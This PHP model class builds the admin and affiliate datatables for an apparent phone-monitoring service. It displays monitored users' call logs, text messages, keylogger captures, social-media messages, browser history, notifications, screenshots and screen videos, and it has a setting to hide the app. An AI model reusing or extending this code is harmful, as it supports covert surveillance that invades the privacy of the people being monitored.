<?php

class Datatable_model extends My_model {

    public function __construct() {
        parent::__construct();
        
    }

    /*
     * Managae Affiliate Datatatbel
     */
    
    public function getAffiliateDatatable(){
        $this->datatables->select('id,user_name,email,phone_no,company_name,url,limit_user,status,monitoring_status');
        $this->datatables->from(TABLE_USER);
        $this->datatables->where('type','3');
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            $id = $this->utility->encode($records["data"][$i][0]);
            
            if ($records["data"][$i][8] == '0') {
                $monitoringStatus = 'Stop';
            } else if ($records["data"][$i][8] == '1') {
                $monitoringStatus = 'Start';
            }
            
            if ($records["data"][$i][7] == '0' || $records["data"][$i][7] == '2') {
                $status = 'Deactive';
            } else if ($records["data"][$i][7] == '1') {
                $status = 'Active';
            }
            
            $url = admin_url().'affiliate/overview/'. $id;
            
            $records["data"][$i][0] = $j;
            $records["data"][$i][7] = '<a href="javascript:;" data-tooltip="Affiliate status" class="affiliateStatus '.$status.'" data-id="'.$id.'" data-status="'.$status.'"><i class="fa fa-circle action_icons"></i></a>
                                       <a href="javascript:;" data-tooltip="Monitoring status" class="monitoringStatus '.$monitoringStatus.'" data-id="'.$id.'" data-status="'.$monitoringStatus.'"><i class="fa fa-circle action_icons"></i></a>
                                       <a href="'.$url.'" class="btn btn-icon-only blue"><i class="fa fa-eye"></i></a>';
        }
        
        return $records;
    }
    /*
     * Managae user Datatatbel
     */
    
    public function getUserDatatable(){
        $this->datatables->select('u.monitoring_status,u.user_name,u.email,u.phone_no,u.user_pin,d.device_name,u.id,u.app_setting');
        $this->datatables->from(TABLE_USER.' u');
        $this->datatables->join(TABLE_DEVICE.' as d','u.id = d.user_id','left');
        $this->datatables->where('u.type','2');
        $this->datatables->where('u.parent_id', $this->userId);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            $id = $this->utility->encode($records["data"][$i][6]);
            if ($records["data"][$i][0] == '0') {
                $status = 'Stop';
            } else if ($records["data"][$i][0] == '1') {
                $status = 'Start';
            }
            
            if ($records["data"][$i][7] == 'hide') {
                $appStatus = 'hide';
                $appClass = 'label-danger';
            } else if ($records["data"][$i][7] == 'show') {
                $appStatus = 'show';
                $appClass = 'label-info';
            }
            
            $url = affiliate_url().'user/overview/'. $id;
            $records["data"][$i][0] = $j;
            $records["data"][$i][6] = '<a href="javascript:;" data-tooltip="Status" class="updateStatus '.$status.'" data-id="'.$id.'" data-status="'.$status.'"><i class="fa fa-circle action_icons"></i></a>
                                       <a href="javascript:;" data-tooltip="Application Setting" class="updateAppStatus" data-id="'.$id.'" data-status="'.$appStatus.'"><span class="label '.$appClass.'">'.ucfirst($appStatus).'</span></a>&nbsp;
                                       <a href="'.$url.'" class="btn btn-sm blue"><i class="fa fa-eye"></i></a>';
        }
        
        return $records;
    }

    /*
     * Managae contact Datatatbel
     */
    
    public function getContactDatatable($id){
        $id = $this->utility->decode($id);
        
        $this->datatables->select('id,name,number');
        $this->datatables->from(TABLE_CONTACT);
        $this->datatables->where('user_id',$id);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        return $records;
    }
    
    /*
     * Managae call Datatatbel
     */
    
    public function getCallDatatable($id,$value){
        $id = $this->utility->decode($id);
        
        $where = $this->datatables->where('user_id',$id);
        
        if(($value != '') && ($value != 'all')){
            if ($value == 'thismonth') {
                $where .= $this->datatables->like('date', date('Y-m'));
            } else if ($value == 'lastmonth') {
                $pm = (int) date('n', strtotime('-1 months'));
                $pmy = (int) date('Y', strtotime('-1 months'));
                
                $where .= $this->datatables->where('MONTH(date)', $pm);
                $where .= $this->datatables->where('YEAR(date)', $pmy);
                
            } else if (strpos($value, 'TO') !== false) {
                
                $date = explode('TO', $value);
                $fromDate = trim($date[0]);
                $toData = trim($date[1]);
                
                $where .= $this->datatables->where('date >=', $fromDate);
                $where .= $this->datatables->where('date <=', $toData);
                
            } else if(($value == 'incoming') || ($value == 'outgoing') || ($value == 'missedcall')){
                
                $where .= $this->datatables->where('call_type', $value);
                
            }else {
                
                $where .= $this->datatables->where('date', $value);
            }
        }
        
        $this->datatables->select('id,name,number,duration,date_time,call_type');
        $this->datatables->from(TABLE_CALL_LOG);
        $where;
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        return $records;
    }
    
    /*
     * Managae message Datatatbel
     */
    
    public function getMessageDatatable($id,$value){
        $id = $this->utility->decode($id);
        
        $where = $this->datatables->where('user_id',$id);
        
        if(($value != '') && ($value != 'all')){
            if ($value == 'thismonth') {
                $where .= $this->datatables->like('date', date('Y-m'));
            } else if ($value == 'lastmonth') {
                $pm = (int) date('n', strtotime('-1 months'));
                $pmy = (int) date('Y', strtotime('-1 months'));
                
                $where .= $this->datatables->where('MONTH(date)', $pm);
                $where .= $this->datatables->where('YEAR(date)', $pmy);
            } else if (strpos($value, 'TO') !== false) {
                $date = explode('TO', $value);
                $fromDate = trim($date[0]);
                $toData = trim($date[1]);
                
                $where .= $this->datatables->where('date >=', $fromDate);
                $where .= $this->datatables->where('date <=', $toData);
            } else if(($value == 'sent') || ($value == 'inbox')){
                $where .= $this->datatables->where('type', $value);
            }else {
                
                $where .= $this->datatables->where('date', $value);
            }
        }
        
        
        $this->datatables->select('id,name,number,text,date_time,type');
        $this->datatables->from(TABLE_MESSAGE);
        $where;
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        return $records;
    }
    
    /*
     * Managae key logger Datatatbel
     */
    
    public function getKeyLoggerDatatable($id){
        $id = $this->utility->decode($id);
        $imageUrl = base_url().'public/upload/app_icons/';
        
        $this->datatables->select('kl.id,kl.application_name,kl.text,kl.date_time');
        $this->datatables->from(TABLE_KEY_LOGGER.' kl');
        $this->datatables->where('kl.user_id',$id);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            $img = $imageUrl.$records["data"][$i][1];
            $records["data"][$i][0] = $j;
        }
        return $records;
    }
    
    /*
     * Managae social media Datatatbel
     */
    
    public function getSocialMediaDatatable($id,$value){
        $id = $this->utility->decode($id);
        $imageUrl = base_url().'public/upload/app_icons/';
        
        $where = $this->datatables->where('sm.user_id',$id);
        
        if(($value != '') && ($value != 'all')){
            $where .= $this->datatables->where('sm.application_id',$value);
        }
        
        $this->datatables->select('sm.id,a.icon,a.name as applicationName,sm.text,sm.date_time,sm.sender_name');
        $this->datatables->from(TABLE_SOCIAL_MEDIA.' sm');
        $this->datatables->join(TABLE_APPLICATION.' as a','sm.application_id = a.id','left');
        $where;
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            $img = $imageUrl.$records["data"][$i][1];
            $records["data"][$i][0] = $j;
            $records["data"][$i][1] = '<img src="'.$img.'" width="20" height="20">';
        }
        return $records;
    }
    
    /*
     * Managae browser history Datatatbel
     */
    
    public function getBrowserHistoryDatatable($id){
        $id = $this->utility->decode($id);
        
        $this->datatables->select('id,title,url,date_time');
        $this->datatables->from(TABLE_BROWSER_HISTORY);
        $this->datatables->where('user_id',$id);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            
            $records["data"][$i][0] = $j;
            
        }
        return $records;
    }
    
    /*
     * Managae notification Datatatbel
     */
    
    public function getNotificationDatatable($id){
        $id = $this->utility->decode($id);
        $imageUrl = base_url().'public/upload/app_icons/';
        
        $this->datatables->select('n.id,a.icon,a.name as applicationName,n.text,n.date,n.time');
        $this->datatables->from(TABLE_NOTIFICATION.' n');
        $this->datatables->join(TABLE_APPLICATION.' as a','n.application_id = a.id','left');
        $this->datatables->where('n.user_id',$id);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            $img = $imageUrl.$records["data"][$i][1];
            $records["data"][$i][0] = $j;
            $records["data"][$i][1] = '<img src="'.$img.'" width="20" height="20">';
        }
        return $records;
    }
    
    /*
     * Managae application Datatatbel
     */
    
    public function getApplicationDatatable($id){
        $id = $this->utility->decode($id);
        $imageUrl = base_url().'public/upload/app_icons/';
        
        $this->datatables->select('au.id,a.icon,a.name,au.status,au.dt_created');
        $this->datatables->from(TABLE_USER_HAS_APPLICATION.' as au');
        $this->datatables->join(TABLE_APPLICATION.' as a','au.app_id = a.id','left');
        $this->datatables->where('au.user_id',$id);
        $result = $this->datatables->generate();
       
        $records = (array) json_decode($result);
        
        $j = 0;
        for ($i = 0; $i < count($records['data']); $i++) {
            $j++;
            $id = $records["data"][$i][0];
            $img = $imageUrl.$records["data"][$i][1];
            
            if($records["data"][$i][3] == '0'){
                $checked = '';
            }else{
                $checked = 'checked';
            }
            
            $records["data"][$i][0] = $j;
            $records["data"][$i][1] = '<img src="'.$img.'" width="20" height="20">';
            $records["data"][$i][3] = ($records["data"][$i][3] == '0') ? 'Sync Off' : 'Sync On';
            
            
            $records["data"][$i][4] = '<input type="checkbox" class="ceckBoxStatus" value="'.$id.'" '.$checked.'>';
            
        }
        return $records;
    }
    
    
    /*
     * Managae Screen pic timeing Datatatbel
     */
    
    public function getScreenPicTimeDatatable($id){
        $user_id = $this->utility->decode($id);
        $this->datatables->select('id,start_date_time,end_date_time,time_interval,status');
        $this->datatables->where('user_id',$user_id);
        $this->datatables->from(TABLE_SCREEN_PHOTO_HAS_TIME);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        $j = 0;
        
        for($i=0; $i<count($records['data']); $i++){
            $j++;
            $ids = $this->utility->encode($records["data"][$i][0]);
            $url = affiliate_url().'user/screen_pic_view/'. $id.'/'.$ids;
            $url2 = affiliate_url().'user/picture_status/';
            $status = $records["data"][$i][4];
            
            if(strtotime(DATE_TIME) > strtotime($records["data"][$i][2])){
                $html = '';
            }else{
                if ($status == '1') {
                    $html = '<a data-id="' . $ids . '" data-table="screen_pic_time" data-status="0" data-href="' . $url2 . '" class="btn btn-icon-only red handle_status">stop</a>';
                } else if ($status == '0') {
                    $html = '<a data-id="' . $ids . '" data-table="screen_pic_time" data-status="1" data-href="' . $url2 . '" class="btn btn-icon-only blue handle_status">start</a>';
                }
            }
            
            $records["data"][$i][0] = $j;
            $records["data"][$i][4] = '<a href="'.$url.'" class="btn btn-icon-only blue"><i class="fa fa-eye"></i></a>'.$html.'';
        }
        
        return $records;
    }
    
    /*
     * Managae Screen video timeing Datatatbel
     */
    
    public function getVideoTimeDatatable($id){
        
        $user_id = $this->utility->decode($id);
        $this->datatables->select('id,start_date_time,end_date_time,status');
        $this->datatables->where('user_id',$user_id);
        $this->datatables->from(TABLE_SCREEN_VIDEO_HAS_TIME);
        $result = $this->datatables->generate();
        $records = (array) json_decode($result);
        
        $j = 0;
        
        for($i=0; $i<count($records['data']); $i++){
            $j++;
            $ids = $this->utility->encode($records["data"][$i][0]);
            $url = affiliate_url().'user/screen_video_timeing/'. $id.'/'.$ids;
            $url2 = affiliate_url().'user/video_status/';
            
            $status = $records["data"][$i][3];
            
            if(strtotime(DATE_TIME) > strtotime($records["data"][$i][2])){
                $html = '';
            }else{
                if ($status == '1') {
                    $html = '<a data-id="' . $ids . '" data-table="screen_video_time" data-status="0" data-href="' . $url2 . '" class="btn btn-icon-only red handle_status">stop</a>';
                } else if ($status == '0') {
                    $html = '<a data-id="' . $ids . '" data-table="screen_video_time" data-status="1" data-href="' . $url2 . '" class="btn btn-icon-only blue handle_status">start</a>';
                }
            }
            
            $records["data"][$i][0] = $j;
            $records["data"][$i][3] = '<a href="'.$url.'" class="btn btn-icon-only blue"><i class="fa fa-eye"></i></a>'.$html.'';
        }
        
        return $records;
    }
            
}

?>